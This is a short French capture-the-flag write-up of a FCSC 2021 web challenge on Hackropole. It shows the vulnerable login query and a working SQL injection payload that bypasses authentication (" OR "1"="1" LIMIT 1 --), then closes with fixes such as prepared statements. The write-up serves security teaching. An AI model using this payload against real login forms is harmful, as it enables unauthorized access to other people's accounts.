# SQL Injection Login Challenge
https://hackropole.fr/fr/challenges/web/fcsc2021-web-push-it-to-the-limit/

## 🎯 Objectif

Se connecter à l'application web en exploitant une vulnérabilité d'injection SQL.

## 🔍 Découverte

En inspectant le code source de l'application, on trouve un commentaire HTML révélant la structure de la requête :

```sql
SELECT * FROM users WHERE username="[INPUT]" AND password="[INPUT]"
```

## 💉 Exploitation

### Première tentative

```sql
" OR "1"="1" --
```

➜ Erreur : "trop de lignes sont retournées par la requête SQL"

### 🛠️ Solution finale

```sql
" OR "1"="1" LIMIT 1 --
```

## Comment ça marche ?

1. `"` ferme le guillemet de la requête
2. `OR "1"="1"` ajoute une condition toujours vraie
3. `LIMIT 1` restreint le résultat à une seule ligne
4. `--` commente le reste de la requête

## 🎉 Flag

Flag obtenu après connexion réussie !


## Correction

Pour sécuriser ce type de vulnérabilité :

- Utiliser des requêtes préparées
- Échapper correctement les entrées utilisateur
- Implémenter une validation côté serveur
